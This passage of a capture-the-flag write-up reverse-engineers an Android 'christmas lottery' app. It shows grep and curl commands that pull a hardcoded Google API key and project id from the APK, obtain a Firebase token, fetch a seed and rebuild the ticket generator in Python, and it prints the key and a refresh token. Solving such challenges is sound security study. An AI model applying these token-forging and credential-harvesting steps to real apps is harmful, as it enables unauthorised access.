+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">i</span><span class="o">/</span><span class="nc">C0320n</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>                <span class="nc">RunnableC0314k</span> <span class="n">runnableC0314k</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">RunnableC0314k</span><span class="o">(</span><span class="n">i3</span><span class="o">,</span> <span class="k">this</span><span class="o">,</span> <span class="k">new</span> <span class="nc">C0310i</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">f3555b</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">f3556c</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">f3562l</span><span class="o">);</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">i</span><span class="o">/</span><span class="no">C0291B</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>                    <span class="o">((</span><span class="nc">MainActivity</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">f3353c</span><span class="o">).</span><span class="na">executorService</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="k">new</span> <span class="nc">RunnableC0314k</span><span class="o">(</span><span class="mi">10</span><span class="o">,</span> <span class="k">this</span><span class="o">,</span> <span class="o">((</span><span class="nc">C0366m</span><span class="o">)</span> <span class="n">task</span><span class="o">.</span><span class="na">getResult</span><span class="o">()).</span><span class="na">f3</span><span class="o">;</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">i</span><span class="o">/</span><span class="nc">RunnableC0314k</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">RunnableC0314k</span> <span class="kd">implements</span> <span class="nc">Runnable</span> <span class="o">{</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">i</span><span class="o">/</span><span class="nc">RunnableC0314k</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>    <span class="kd">public</span> <span class="cm">/* synthetic */</span> <span class="nc">RunnableC0314k</span><span class="o">(</span><span class="kt">int</span> <span class="n">i3</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">obj2</span><span class="o">)</span> <span class="o">{</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">i</span><span class="o">/</span><span class="nc">RunnableC0314k</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>                        <span class="o">((</span><span class="nc">MainActivity</span><span class="o">)</span> <span class="o">((</span><span class="nc">RunnableC0314k</span><span class="o">)</span> <span class="n">obj</span><span class="o">).</span><span class="na">f3546c</span><span class="o">).</span><span class="na">secretSeed</span> <span class="o">=</span> <span class="o">((</span><span class="nc">JSONObject</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">f3545b</span><span class="o">).</span><span class="na">getLong</span><span class="o">(</span><span class="s">"seed;
+./sources/i/RunnableC0314k.java:                        Toast.makeText((MainActivity) ((RunnableC0314k) obj).f3546c, "</span><span class="nc">Init</span> <span class="nl">error:</span> <span class="s">" + strOptString, 0).show(;
+./sources/i/RunnableC0314k.java:                    Toast.makeText((MainActivity) ((RunnableC0314k) obj).f3546c, "</span><span class="nc">Bad</span> <span class="no">JSON</span> <span class="n">from</span> <span class="n">init</span><span class="s">", 0).show();
+./sources/i/RunnableC0314k.java:                Toast.makeText((MainActivity) ((RunnableC0314k) obj).f3546c, "</span><span class="nc">Failed</span> <span class="n">to</span> <span class="n">init</span> <span class="nl">seed:</span> <span class="s">" + ((Exception) this.f35;
+./sources/i/RunnableC0314k.java:                        ((MainActivity) obj).runOnUiThread(new RunnableC0314k(6, this, new JSONObject(bC.f930j.c())));
+./sources/i/RunnableC0314k.java:                    ((MainActivity) obj).runOnUiThread(new RunnableC0314k(7, this, e4));
+./sources/i/RunnableC0314k.java:                Toast.makeText((MainActivity) ((C0291B) ((RunnableC0314k) obj).f3546c).f3353c, "</span><span class="nl">Error:</span> <span class="err">"</span> <span class="o">+</span> <span class="o">((</span><span class="nc">Exception</span><span class="o">)</span> <span class="k">this</span><span class="o">;</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">i</span><span class="o">/</span><span class="nc">RunnableC0314k</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>                    <span class="o">((</span><span class="nc">MainActivity</span><span class="o">)</span> <span class="o">((</span><span class="no">C0291B</span><span class="o">)</span> <span class="n">obj</span><span class="o">).</span><span class="na">f3353c</span><span class="o">).</span><span class="na">runOnUiThread</span><span class="o">(</span><span class="k">new</span> <span class="nc">RunnableC0314k</span><span class="o">(</span><span class="mi">9</span><span class="o">,</span> <span class="k">this</span><span class="o">,</span> <span class="n">e5</span><span class="o">));</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">i</span><span class="o">/</span><span class="nc">RunnableC0314k</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>    <span class="kd">public</span> <span class="cm">/* synthetic */</span> <span class="nc">RunnableC0314k</span><span class="o">(</span><span class="nc">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">obj2</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i3</span><span class="o">)</span> <span class="o">{</span>
+</code></pre></div></div>
+
+<p>let’s look at the source for that <code class="language-plaintext highlighter-rouge">Runnable...</code> file. this code is pretty badly obfuscated, but we still have the source, so let’s try our best:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="mi">8</span><span class="o">:</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="nc">ArrayList</span> <span class="n">arrayList</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">();</span>
+        <span class="nc">ArrayList</span> <span class="n">arrayList2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">();</span>
+        <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">f3545b</span><span class="o">;</span>
+        <span class="n">k1</span><span class="o">.</span><span class="na">j</span><span class="o">.</span><span class="na">o</span><span class="o">(</span><span class="n">str</span><span class="o">,</span> <span class="s">"value"</span><span class="o">);</span>
+        <span class="kt">char</span><span class="o">[]</span> <span class="n">cArr</span> <span class="o">=</span> <span class="no">W1</span><span class="o">.</span><span class="na">u</span><span class="o">.</span><span class="na">f1049k</span><span class="o">;</span>
+        <span class="n">arrayList</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="no">W1</span><span class="o">.</span><span class="na">n</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="s">"idToken"</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="s">" \"':;&lt;=&gt;@[]^`{}|/\\?#&amp;!$(),~"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="mi">91</span><span class="o">));</span>
+        <span class="n">arrayList2</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="no">W1</span><span class="o">.</span><span class="na">n</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">str</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="s">" \"':;&lt;=&gt;@[]^`{}|/\\?#&amp;!$(),~"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="mi">91</span><span class="o">));</span>
+        <span class="no">W1</span><span class="o">.</span><span class="na">p</span> <span class="n">pVar</span> <span class="o">=</span> <span class="k">new</span> <span class="no">W1</span><span class="o">.</span><span class="na">p</span><span class="o">(</span><span class="n">arrayList</span><span class="o">,</span> <span class="n">arrayList2</span><span class="o">);</span>
+        <span class="no">W1</span><span class="o">.</span><span class="na">z</span> <span class="n">zVar</span> <span class="o">=</span> <span class="k">new</span> <span class="no">W1</span><span class="o">.</span><span class="na">z</span><span class="o">();</span>
+              <span class="n">zVar</span><span class="o">.</span><span class="na">d</span><span class="o">(((</span><span class="nc">MainActivity</span><span class="o">)</span> <span class="n">obj</span><span class="o">).</span><span class="na">backendUrl</span> <span class="o">+</span> <span class="s">"/init"</span><span class="o">);</span>
+              <span class="n">zVar</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="s">"POST"</span><span class="o">,</span> <span class="n">pVar</span><span class="o">);</span>
+              <span class="nc">C0339x</span> <span class="n">c0339xA</span> <span class="o">=</span> <span class="n">zVar</span><span class="o">.</span><span class="na">a</span><span class="o">();</span>
+              <span class="no">W1</span><span class="o">.</span><span class="na">x</span> <span class="n">xVar</span> <span class="o">=</span> <span class="o">((</span><span class="nc">MainActivity</span><span class="o">)</span> <span class="n">obj</span><span class="o">).</span><span class="na">httpClient</span><span class="o">;</span>
+              <span class="n">xVar</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+              <span class="n">bC</span> <span class="o">=</span> <span class="k">new</span> <span class="n">a2</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">xVar</span><span class="o">,</span> <span class="n">c0339xA</span><span class="o">,</span> <span class="kc">false</span><span class="o">).</span><span class="na">c</span><span class="o">();</span>
+              <span class="k">try</span> <span class="o">{</span>
+                  <span class="o">((</span><span class="nc">MainActivity</span><span class="o">)</span> <span class="n">obj</span><span class="o">).</span><span class="na">runOnUiThread</span><span class="o">(</span><span class="k">new</span> <span class="nc">RunnableC0314k</span><span class="o">(</span><span class="mi">6</span><span class="o">,</span> <span class="k">this</span><span class="o">,</span> <span class="k">new</span> <span class="nc">JSONObject</span><span class="o">(</span><span class="n">bC</span><span class="o">.</span><span class="na">f930j</span><span class="o">.</span><span class="na">c</span><span class="o">())));</span>
+                  <span class="n">bC</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+                  <span class="k">return</span><span class="o">;</span>
+              <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+              <span class="o">}</span>
+          <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e4</span><span class="o">)</span> <span class="o">{</span>
+              <span class="o">((</span><span class="nc">MainActivity</span><span class="o">)</span> <span class="n">obj</span><span class="o">).</span><span class="na">runOnUiThread</span><span class="o">(</span><span class="k">new</span> <span class="nc">RunnableC0314k</span><span class="o">(</span><span class="mi">7</span><span class="o">,</span> <span class="k">this</span><span class="o">,</span> <span class="n">e4</span><span class="o">));</span>
+              <span class="k">return</span><span class="o">;</span>
+          <span class="o">}</span>
+</code></pre></div></div>
+
+<p>we can see a reference to <code class="language-plaintext highlighter-rouge">backendUrl</code>, <code class="language-plaintext highlighter-rouge">/init</code>, some <code class="language-plaintext highlighter-rouge">POST</code> command, and uhh, eventually, this becomes a JSON somehow, i suppose. so what even is the <code class="language-plaintext highlighter-rouge">backendUrl?</code> let’s just spam greps…</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="nd">@curette</span> <span class="o">(-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="o">/</span><span class="n">out</span><span class="o">)</span> <span class="o">&gt;</span> <span class="n">grep</span> <span class="o">-</span><span class="no">R</span> <span class="err">'</span><span class="n">backendUrl</span><span class="err">'</span> <span class="o">.</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">christmas</span><span class="o">/</span><span class="n">lottery</span><span class="o">/</span><span class="nc">MainActivity</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>    <span class="kd">private</span> <span class="nc">String</span> <span class="n">backendUrl</span><span class="o">;</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">christmas</span><span class="o">/</span><span class="n">lottery</span><span class="o">/</span><span class="nc">MainActivity</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>        <span class="k">this</span><span class="o">.</span><span class="na">backendUrl</span> <span class="o">=</span> <span class="n">getString</span><span class="o">(</span><span class="nc">AbstractC0460d</span><span class="o">.</span><span class="na">backend_url</span><span class="o">);</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">i</span><span class="o">/</span><span class="nc">RunnableC0314k</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>                    <span class="n">zVar</span><span class="o">.</span><span class="na">d</span><span class="o">(((</span><span class="nc">MainActivity</span><span class="o">)</span> <span class="n">obj</span><span class="o">).</span><span class="na">backendUrl</span> <span class="o">+</span> <span class="s">"/init"</span><span class="o">);</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">i</span><span class="o">/</span><span class="nc">RunnableC0314k</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>                    <span class="n">zVar2</span><span class="o">.</span><span class="na">d</span><span class="o">(((</span><span class="nc">MainActivity</span><span class="o">)</span> <span class="o">((</span><span class="no">C0291B</span><span class="o">)</span> <span class="n">obj</span><span class="o">).</span><span class="na">f3353c</span><span class="o">).</span><span class="na">backendUrl</span> <span class="o">+</span> <span class="s">"/validate"</span><span class="o">);</span>
+                                                                                                                                                             
+<span class="n">navi</span><span class="nd">@curette</span> <span class="o">(-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="o">/</span><span class="n">out</span><span class="o">)</span> <span class="o">&gt;</span> <span class="n">grep</span> <span class="o">-</span><span class="no">R</span> <span class="err">'</span><span class="n">backend_url</span><span class="err">'</span> <span class="o">.</span>
+<span class="o">./</span><span class="n">resources</span><span class="o">/</span><span class="n">res</span><span class="o">/</span><span class="n">values</span><span class="o">/</span><span class="n">strings</span><span class="o">.</span><span class="na">xml</span><span class="o">:</span>    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"backend_url"</span><span class="o">&gt;</span>
+<span class="nl">https:</span><span class="c1">//us-central1-christmas-lottery-b838b.cloudfunctions.net</span>
+<span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>haha hey there we go. fuck it let’s just curl it directly?</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="nd">@curette</span> <span class="o">(~)</span> <span class="o">&gt;</span> <span class="n">curl</span> <span class="o">-</span><span class="no">X</span> <span class="no">POST</span> <span class="err">'</span><span class="nl">https:</span><span class="c1">//us-central1-christmas-lottery-b838b.cloudfunctions.net/init'</span>
+<span class="o">{</span><span class="s">"error"</span><span class="o">:</span><span class="s">"Missing idToken"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>missing <code class="language-plaintext highlighter-rouge">idToken</code>…?</p>
+
+<p>now it behooves us to learn more about Firebase. the <code class="language-plaintext highlighter-rouge">idToken</code> is not part of the app, but rather Google’s own authentication provider. when the app is launched, it will request this <code class="language-plaintext highlighter-rouge">idToken</code> from google given a <code class="language-plaintext highlighter-rouge">project_id</code> and an <code class="language-plaintext highlighter-rouge">api_key</code>. the <code class="language-plaintext highlighter-rouge">api_key</code> is clearly stored within the .apk somewhere, so where is it?</p>
+
+<p>(you’ll never believe what we do next)</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="nd">@curette</span> <span class="o">(-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="o">/</span><span class="n">out</span><span class="o">)</span> <span class="o">&gt;</span> <span class="n">grep</span> <span class="o">-</span><span class="no">R</span> <span class="err">'</span><span class="n">api_key</span><span class="err">'</span> <span class="o">.</span>             
+<span class="o">./</span><span class="n">resources</span><span class="o">/</span><span class="n">res</span><span class="o">/</span><span class="n">values</span><span class="o">/</span><span class="n">strings</span><span class="o">.</span><span class="na">xml</span><span class="o">:</span>    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"google_api_key"</span><span class="o">&gt;</span><span class="nc">AIzaSyCci4KfQm1vcGIrBgdVM94hkbSMYmDiGi4</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span>
+<span class="o">./</span><span class="n">resources</span><span class="o">/</span><span class="n">res</span><span class="o">/</span><span class="n">values</span><span class="o">/</span><span class="n">strings</span><span class="o">.</span><span class="na">xml</span><span class="o">:</span>    <span class="o">&lt;</span><span class="n">string</span> <span class="n">name</span><span class="o">=</span><span class="s">"google_crash_reporting_api_key"</span><span class="o">&gt;</span><span class="nc">AIzaSyCci4KfQm1vcGIrBgdVM94hkbSMYmDiGi4</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span>
+<span class="o">./</span><span class="n">resources</span><span class="o">/</span><span class="n">res</span><span class="o">/</span><span class="n">values</span><span class="o">/</span><span class="kd">public</span><span class="o">.</span><span class="na">xml</span><span class="o">:</span>    <span class="o">&lt;</span><span class="kd">public</span> <span class="n">type</span><span class="o">=</span><span class="s">"string"</span> <span class="n">name</span><span class="o">=</span><span class="s">"google_api_key"</span> <span class="n">id</span><span class="o">=</span><span class="s">"0x7f0e0069"</span> <span class="o">/&gt;</span>
+</code></pre></div></div>
+
+<p>lol, lmao even.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"google_api_key"</span><span class="nt">&gt;</span>AIzaSyCci4KfQm1vcGIrBgdVM94hkbSMYmDiGi4<span class="nt">&lt;/string&gt;</span>
+<span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"project_id"</span><span class="nt">&gt;</span>christmas-lottery-b838b<span class="nt">&lt;/string&gt;</span>
+</code></pre></div></div>
+
+<p>yuppp okay that is quite literally Everything we need.we just request for this token ourselves, specifying all the necessary data w/ curl:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="nd">@curette</span> <span class="o">(-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="o">/</span><span class="n">out</span><span class="o">)</span> <span class="o">&gt;</span> <span class="n">curl</span> <span class="o">-</span><span class="no">X</span> <span class="no">POST</span> <span class="err">\</span>
+  <span class="s">"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyCci4KfQm1vcGIrBgdVM94hkbSMYmDiGi4"</span> <span class="err">\</span>
+  <span class="o">-</span><span class="no">H</span> <span class="s">"Content-Type: application/json"</span> <span class="err">\</span>
+  <span class="o">-</span><span class="n">d</span> <span class="err">'</span><span class="o">{</span><span class="s">"project_id"</span><span class="o">:</span> <span class="s">"christmas-lottery-b838b"</span><span class="o">}</span><span class="err">'</span> <span class="o">|</span> <span class="n">jq</span>
+
+<span class="o">{</span>
+  <span class="s">"kind"</span><span class="o">:</span> <span class="s">"identitytoolkit#SignupNewUserResponse"</span><span class="o">,</span>
+  <span class="s">"idToken"</span><span class="o">:</span> <span class="s">"..."</span><span class="o">,</span>
+  <span class="s">"refreshToken"</span><span class="o">:</span> <span class="s">"AMf-vBw3FyOA-y9vna3lv705IrRFILySOkP_GAURrZ-CMGhJXKEPX6Ti8F-YspaT6XkqWcQkNBJEqPWKs_kUz_GMh-pDH0gkCiF4fCW9WstcWqJdIq9cPmzw6T4eNMrEs4IZZws4eLJpB_pTEOsRbOnbBQrzOXYreHJTFNPj2NiPKgOva6VUhO6X8PnkuxvupPCFe32GYrF66vQz5p5MWNYs3W8FpJGZzA"</span><span class="o">,</span>
+  <span class="s">"expiresIn"</span><span class="o">:</span> <span class="s">"3600"</span><span class="o">,</span>
+  <span class="s">"localId"</span><span class="o">:</span> <span class="s">"aR3HNRNQCsOzeevEXHJWrxSzS6i2"</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>ok great! we now have a valid <code class="language-plaintext highlighter-rouge">idToken</code>. let’s try interacting with the application again.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="nd">@curette</span> <span class="o">(-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="o">/</span><span class="n">out</span><span class="o">)</span> <span class="o">&gt;</span> <span class="n">curl</span> <span class="o">-</span><span class="no">X</span> <span class="no">POST</span> <span class="err">'</span><span class="nl">https:</span><span class="c1">//us-central1-christmas-lottery-b838b.cloudfunctions.net/init' -H 'Content-Type: application/json' -d '{"idToken":"..."}'</span>
+<span class="o">{</span><span class="s">"seed"</span><span class="o">:</span><span class="mi">1251732182</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>now we have this ‘seed’. this seed is used to generate some token which is then sent over to <code class="language-plaintext highlighter-rouge">/validate</code>, and if the token is valid, then we get the flag. but we can just generate this token ourselves, and send the request to the validate endpoint ourselves too. the token is generated here:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nc">String</span> <span class="nf">generateTicketCode</span><span class="o">()</span> <span class="o">{</span>
+    <span class="nc">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
+    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i3</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i3</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i3</span><span class="o">++)</span> <span class="o">{</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"ABCDEFGHJKLMNPQRSTUVWXYZ"</span><span class="o">.</span><span class="na">charAt</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span> <span class="o">((</span><span class="k">this</span><span class="o">.</span><span class="na">secretSeed</span> <span class="o">&gt;&gt;</span> <span class="o">(</span><span class="n">i3</span> <span class="o">*</span> <span class="mi">3</span><span class="o">))</span> <span class="o">%</span> <span class="mi">24</span><span class="o">)));</span>
+    <span class="o">}</span>
+    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"-"</span><span class="o">);</span>
+    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i4</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i4</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="o">;</span> <span class="n">i4</span><span class="o">++)</span> <span class="o">{</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"0123456789"</span><span class="o">.</span><span class="na">charAt</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span> <span class="o">((</span><span class="k">this</span><span class="o">.</span><span class="na">secretSeed</span> <span class="o">&gt;&gt;</span> <span class="o">((</span><span class="n">i4</span> <span class="o">*</span> <span class="mi">4</span><span class="o">)</span> <span class="o">+</span> <span class="mi">9</span><span class="o">))</span> <span class="o">%</span> <span class="mi">10</span><span class="o">)));</span>
+    <span class="o">}</span>
+    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"-"</span><span class="o">);</span>
+    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i5</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i5</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="o">;</span> <span class="n">i5</span><span class="o">++)</span> <span class="o">{</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"ABCDEFGHJKLMNPQRSTUVWXYZ"</span><span class="o">.</span><span class="na">charAt</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span> <span class="o">((</span><span class="k">this</span><span class="o">.</span><span class="na">secretSeed</span> <span class="o">&gt;&gt;</span> <span class="o">((</span><span class="n">i5</span> <span class="o">*</span> <span class="mi">5</span><span class="o">)</span> <span class="o">+</span> <span class="mi">25</span><span class="o">))</span> <span class="o">%</span> <span class="mi">24</span><span class="o">)));</span>
+    <span class="o">}</span>
+    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"0123456789"</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">calculateChecksum</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">replace</span><span class="o">(</span><span class="s">"-"</span><span class="o">,</span> <span class="s">""</span><span class="o">))</span> <span class="o">%</span> <span class="mi">10</span><span class="o">));</span>
+    <span class="k">return</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>this is entirely deterministic and only depends on the seed. i hate java so i just whacked this into an llm and asked it to reimplement in something i can actually run (Python), which then gives the corresponding token here:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="o">@</span><span class="n">curette</span> <span class="p">(</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">python</span> <span class="n">gen</span><span class="p">.</span><span class="n">py</span> <span class="mi">19645546</span>
+<span class="n">LPB</span><span class="o">-</span><span class="mi">0899</span><span class="o">-</span><span class="n">AA8</span>
+                                                                                                                                                                                             
+<span class="n">navi</span><span class="o">@</span><span class="n">curette</span> <span class="p">(</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">cat</span> <span class="n">gen</span><span class="p">.</span><span class="n">py</span>
+<span class="n">ALPHABET</span> <span class="o">=</span> <span class="s">"ABCDEFGHJKLMNPQRSTUVWXYZ"</span>
+
+<span class="k">def</span> <span class="nf">calculate_checksum</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+    <span class="n">total</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">c</span><span class="p">.</span><span class="n">isdigit</span><span class="p">():</span>
+            <span class="n">total</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">total</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'@'</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">total</span> <span class="o">%</span> <span class="mi">10</span>
+
+<span class="k">def</span> <span class="nf">generate_ticket</span><span class="p">(</span><span class="n">seed</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">sb</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+        <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="n">seed</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">3</span><span class="p">))</span> <span class="o">%</span> <span class="mi">24</span>
+        <span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ALPHABET</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">idx</span><span class="p">)])</span>
+    <span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"-"</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+        <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="n">seed</span> <span class="o">&gt;&gt;</span> <span class="p">((</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">9</span><span class="p">))</span> <span class="o">%</span> <span class="mi">10</span>
+        <span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">idx</span><span class="p">)))</span>
+    <span class="n">sb</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"-"</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
